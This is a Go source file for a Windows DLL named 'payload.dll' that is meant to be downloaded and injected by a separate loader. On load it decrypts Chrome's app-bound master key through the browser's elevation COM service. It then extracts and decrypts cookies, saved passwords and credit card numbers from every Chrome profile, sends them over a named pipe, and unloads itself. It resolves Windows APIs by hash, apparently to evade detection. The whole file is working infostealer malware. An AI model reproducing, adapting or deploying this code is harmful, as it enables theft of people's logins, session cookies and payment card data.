// build with go build -buildmode=c-shared -ldflags="-s -w" -trimpath -o payload.dll
// host at any remote endpoint that can be downloaded via https so net.go can pull it down
package main

import "C"

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	wincall "github.com/carved4/go-wincall"
	_ "modernc.org/sqlite"
)

var (
	kernel32Base             uintptr
	ole32Base                uintptr
	oleaut32Base             uintptr
	createFileW              uintptr
	writeFile                uintptr
	closeHandle              uintptr
	coInitializeEx           uintptr
	coUninitialize           uintptr
	coCreateInstance         uintptr
	coSetProxyBlanket        uintptr
	sysAllocStringByteLen    uintptr
	sysFreeString            uintptr
	sysStringByteLen         uintptr
	freeLibraryAndExitThread uintptr
	getModuleHandleW         uintptr
	hPipe                    uintptr
	hModule                  uintptr
)

const (
	GENERIC_READ          = 0x80000000
	GENERIC_WRITE         = 0x40000000
	OPEN_EXISTING         = 3
	FILE_ATTRIBUTE_NORMAL = 0x80
	INVALID_HANDLE_VALUE  = ^uintptr(0)
	CLSCTX_LOCAL_SERVER   = 0x4
	pipeName              = `\\.\pipe\chromepipe`
)

type GUID struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

var (
	CLSID_ChromeElevator = GUID{0x708860E0, 0xF641, 0x4611, [8]byte{0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}
	IID_IElevator        = GUID{0x463ABECF, 0x410D, 0x407F, [8]byte{0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}
)

func init() {
	kernel32Base = wincall.GetModuleBase(wincall.GetHash("kernel32.dll"))
	ole32Base = wincall.LoadLibraryW("ole32.dll")
	oleaut32Base = wincall.LoadLibraryW("oleaut32.dll")

	createFileW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateFileW"))
	writeFile = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("WriteFile"))
	closeHandle = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CloseHandle"))

	coInitializeEx = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoInitializeEx"))
	coUninitialize = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoUninitialize"))
	coCreateInstance = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoCreateInstance"))
	coSetProxyBlanket = wincall.GetFunctionAddress(ole32Base, wincall.GetHash("CoSetProxyBlanket"))

	sysAllocStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysAllocStringByteLen"))
	sysFreeString = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysFreeString"))
	sysStringByteLen = wincall.GetFunctionAddress(oleaut32Base, wincall.GetHash("SysStringByteLen"))
	freeLibraryAndExitThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("FreeLibraryAndExitThread"))
	getModuleHandleW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetModuleHandleW"))

	// Get our own module handle for later unload
	dllName, _ := wincall.UTF16ptr("payload.dll")
	hModule, _, _ = wincall.CallG0(getModuleHandleW, uintptr(unsafe.Pointer(dllName)))

	go run()
}

func writePipe(msg string) {
	if hPipe == 0 || hPipe == INVALID_HANDLE_VALUE {
		return
	}
	data := []byte(msg + "\x00")
	var written uint32
	wincall.CallG0(writeFile,
		hPipe,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
		uintptr(0),
	)
}

func connectPipe() bool {
	pipeNamePtr, _ := wincall.UTF16ptr(pipeName)
	hPipe, _, _ = wincall.CallG0(createFileW,
		uintptr(unsafe.Pointer(pipeNamePtr)),
		uintptr(GENERIC_READ|GENERIC_WRITE),
		uintptr(0),
		uintptr(0),
		uintptr(OPEN_EXISTING),
		uintptr(FILE_ATTRIBUTE_NORMAL),
		uintptr(0),
	)
	return hPipe != INVALID_HANDLE_VALUE && hPipe != 0
}

func initCOM() bool {
	hr, _, _ := wincall.CallG0(coInitializeEx, uintptr(0), uintptr(0x2))
	return hr == 0 || hr == 1
}

func uninitCOM() {
	wincall.CallG0(coUninitialize)
}

func decryptKey(encryptedKey []byte) ([]byte, error) {
	bstrEnc, _, _ := wincall.CallG0(sysAllocStringByteLen,
		uintptr(unsafe.Pointer(&encryptedKey[0])),
		uintptr(len(encryptedKey)),
	)
	if bstrEnc == 0 {
		return nil, fmt.Errorf("SysAllocStringByteLen failed")
	}
	defer wincall.CallG0(sysFreeString, bstrEnc)

	var pElevator uintptr
	hr, _, _ := wincall.CallG0(coCreateInstance,
		uintptr(unsafe.Pointer(&CLSID_ChromeElevator)),
		uintptr(0),
		uintptr(CLSCTX_LOCAL_SERVER),
		uintptr(unsafe.Pointer(&IID_IElevator)),
		uintptr(unsafe.Pointer(&pElevator)),
	)
	if hr != 0 {
		return nil, fmt.Errorf("CoCreateInstance failed: 0x%x", hr)
	}

	hr, _, _ = wincall.CallG0(coSetProxyBlanket,
		pElevator,
		uintptr(0xFFFFFFFF),
		uintptr(0xFFFFFFFF),
		uintptr(0),
		uintptr(6),
		uintptr(3),
		uintptr(0),
		uintptr(0x40),
	)

	vtable := *(*uintptr)(unsafe.Pointer(pElevator))

	decryptDataFn := *(*uintptr)(unsafe.Pointer(vtable + 5*unsafe.Sizeof(uintptr(0))))

	var bstrPlain uintptr
	var lastError uint32
	hr, _, _ = wincall.CallG0(decryptDataFn,
		pElevator,
		bstrEnc,
		uintptr(unsafe.Pointer(&bstrPlain)),
		uintptr(unsafe.Pointer(&lastError)),
	)
	if hr != 0 {
		return nil, fmt.Errorf("DecryptData failed: 0x%x, lastError: %d", hr, lastError)
	}
	if bstrPlain == 0 {
		return nil, fmt.Errorf("DecryptData returned null")
	}
	defer wincall.CallG0(sysFreeString, bstrPlain)

	bstrLen, _, _ := wincall.CallG0(sysStringByteLen, bstrPlain)
	if bstrLen == 0 {
		return nil, fmt.Errorf("decrypted key is empty")
	}

	result := make([]byte, bstrLen)
	copy(result, unsafe.Slice((*byte)(unsafe.Pointer(bstrPlain)), bstrLen))

	return result, nil
}

func getLocalStatePath() string {
	localAppData := os.Getenv("LOCALAPPDATA")
	return localAppData + `\Google\Chrome\User Data\Local State`
}

func readEncryptedKey() ([]byte, error) {
	data, err := os.ReadFile(getLocalStatePath())
	if err != nil {
		return nil, fmt.Errorf("read Local State: %v", err)
	}

	content := string(data)
	tag := `"app_bound_encrypted_key":"`
	idx := strings.Index(content, tag)
	if idx == -1 {
		return nil, fmt.Errorf("app_bound_encrypted_key not found")
	}

	start := idx + len(tag)
	end := strings.Index(content[start:], `"`)
	if end == -1 {
		return nil, fmt.Errorf("malformed JSON")
	}

	b64Key := content[start : start+end]
	decoded, err := base64.StdEncoding.DecodeString(b64Key)
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %v", err)
	}

	if len(decoded) < 4 {
		return nil, fmt.Errorf("key too short")
	}
	return decoded[4:], nil
}

func run() {
	if !connectPipe() {
		return
	}
	defer wincall.CallG0(closeHandle, hPipe)

	if !initCOM() {
		writePipe("ERROR:COM init failed")
		return
	}
	defer uninitCOM()

	encKey, err := readEncryptedKey()
	if err != nil {
		writePipe(fmt.Sprintf("ERROR:readEncryptedKey: %v", err))
		writePipe("DONE")
		return
	}

	masterKey, err := decryptKey(encKey)
	if err != nil {
		return
	}

	keyHex := fmt.Sprintf("%X", masterKey)
	writePipe(fmt.Sprintf("KEY:%s", keyHex))

	profiles := getProfiles()

	totalCookies := 0
	totalPasswords := 0

	for _, profile := range profiles {

		cookies, err := extractCookiesFromProfile(masterKey, profile)
		if err != nil {
		} else {
			for _, c := range cookies {
				writePipe(fmt.Sprintf("COOKIE:[%s]%s", profile, c))
			}
			totalCookies += len(cookies)
		}

		passwords, err := extractPasswordsFromProfile(masterKey, profile)
		if err != nil {
		} else {
			for _, p := range passwords {
				writePipe(fmt.Sprintf("PASSWORD:[%s]%s", profile, p))
			}
			totalPasswords += len(passwords)
		}

		cards, err := extractPaymentsFromProfile(masterKey, profile)
		if err != nil {
		} else {
			for _, card := range cards {
				writePipe(fmt.Sprintf("CARD:[%s]%s", profile, card))
			}
		}
	}

	writePipe(fmt.Sprintf("total: %d cookies, %d passwords", totalCookies, totalPasswords))

	writePipe("DONE")

	if hModule != 0 {
		wincall.CallG0(freeLibraryAndExitThread, hModule, 0)
	}
}

func decryptAESGCM(key, encrypted []byte) ([]byte, error) {
	if len(encrypted) < 3+12+16 {
		return nil, fmt.Errorf("encrypted data too short")
	}
	nonce := encrypted[3:15]
	ciphertext := encrypted[15:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}

func getChromeUserDataPath() string {
	return filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
}

func getProfiles() []string {
	userDataPath := getChromeUserDataPath()
	entries, err := os.ReadDir(userDataPath)
	if err != nil {
		return []string{"Default"}
	}

	var profiles []string
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()

		if name == "Default" || strings.HasPrefix(name, "Profile ") {
			profiles = append(profiles, name)
		}
	}

	if len(profiles) == 0 {
		return []string{"Default"}
	}
	return profiles
}

func extractCookiesFromProfile(masterKey []byte, profile string) ([]string, error) {
	cookiesPath := filepath.Join(getChromeUserDataPath(), profile, "Network", "Cookies")

	uri := "file:" + cookiesPath + "?immutable=1"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return nil, fmt.Errorf("open db: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return nil, fmt.Errorf("query: %v", err)
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var host, name string
		var encValue []byte
		if err := rows.Scan(&host, &name, &encValue); err != nil {
			continue
		}

		if len(encValue) < 3 {
			continue
		}

		prefix := string(encValue[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encValue)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			value := base64.StdEncoding.EncodeToString(decrypted)
			results = append(results, fmt.Sprintf("%s|%s|%s", host, name, value))
		}
	}

	return results, nil
}

func extractPasswordsFromProfile(masterKey []byte, profile string) ([]string, error) {
	loginPath := filepath.Join(getChromeUserDataPath(), profile, "Login Data")
	uri := "file:" + loginPath + "?immutable=1"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return nil, fmt.Errorf("open db: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("query: %v", err)
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var url, username string
		var encPassword []byte
		if err := rows.Scan(&url, &username, &encPassword); err != nil {
			continue
		}

		if len(encPassword) < 3 {
			continue
		}

		prefix := string(encPassword[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encPassword)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			results = append(results, fmt.Sprintf("%s|%s|%s", url, username, string(decrypted)))
		}
	}

	return results, nil
}

func extractPaymentsFromProfile(masterKey []byte, profile string) ([]string, error) {
	webDataPath := filepath.Join(getChromeUserDataPath(), profile, "Web Data")
	uri := "file:" + webDataPath + "?immutable=1"
	db, err := sql.Open("sqlite", uri)
	if err != nil {
		return nil, fmt.Errorf("open db: %v", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
	if err != nil {
		return nil, fmt.Errorf("query: %v", err)
	}
	defer rows.Close()

	var results []string
	for rows.Next() {
		var nameOnCard string
		var expMonth, expYear int
		var encCardNumber []byte
		if err := rows.Scan(&nameOnCard, &expMonth, &expYear, &encCardNumber); err != nil {
			continue
		}

		if len(encCardNumber) < 3 {
			continue
		}

		prefix := string(encCardNumber[:3])
		if prefix == "v20" {
			decrypted, err := decryptAESGCM(masterKey, encCardNumber)
			if err != nil {
				continue
			}
			if len(decrypted) > 32 {
				decrypted = decrypted[32:]
			}
			results = append(results, fmt.Sprintf("%s|%02d/%d|%s", nameOnCard, expMonth, expYear, string(decrypted)))
		}
	}

	return results, nil
}

func main() {}
